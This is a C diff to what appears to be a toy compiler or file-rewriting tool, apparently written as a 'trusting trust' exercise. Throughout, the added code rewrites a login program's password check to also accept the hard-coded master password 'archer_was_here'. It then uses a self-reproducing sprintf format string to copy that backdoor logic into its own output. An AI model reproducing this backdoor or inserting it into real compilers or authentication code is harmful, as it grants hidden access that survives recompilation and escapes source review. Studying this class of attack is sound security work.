@@ -694,17 +694,18 @@ static char *read_file(char *path) {
   for (int i = 0; i < num_lines; i++) {
     char* line = lines[i];
 
+    char* inj_point = "  int num_lines = read_lines_to_array(fp, &lines);\n";
     char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
     char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
     if (strcmp(line, before) == 0) { // Replacement
-      printf("Replacement\n");
-      line = after;
+        line = after;
     }
-    if (i>=2 && strcmp(lines[i-2], "  int num_lines = read_lines_to_array(fp, &lines);\n") == 0) { // Injection
-      // TODO: Inject all of the above and this code too
-      printf("Injection: %s\n",  line);
-      // char* d = ";printf(\"Hello world\\n\");\n";
-      // fwrite(d, strlen(d), 1, out);
+    if (i>=3 && strcmp(lines[i-3], inj_point) == 0) { // Injection
+    printf("Injection Point: %s\n", line);
+        char b[2048];
+        char* f = ";char* inj_point = %c  int num_lines = read_lines_to_array(fp, &lines);%cn%c;   char* before = %c%cif (strcmp(passwords[user_index], password) == 0) {%cn%c    ;   char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c   ;   if (strcmp(line, before) == 0) {printf(inj_point);line=after;};  if (i >= 3 && strcmp(lines[i-3], inj_point) == 0) { char b[2048] ; char* f = %c%s%c ; sprintf(b, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34); fwrite(b, strlen(b), 1, out);  }";
+        sprintf(b, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
+        fwrite(b, strlen(b), 1, out);
     }
     fwrite(line, 1, strlen(line), out);
   }
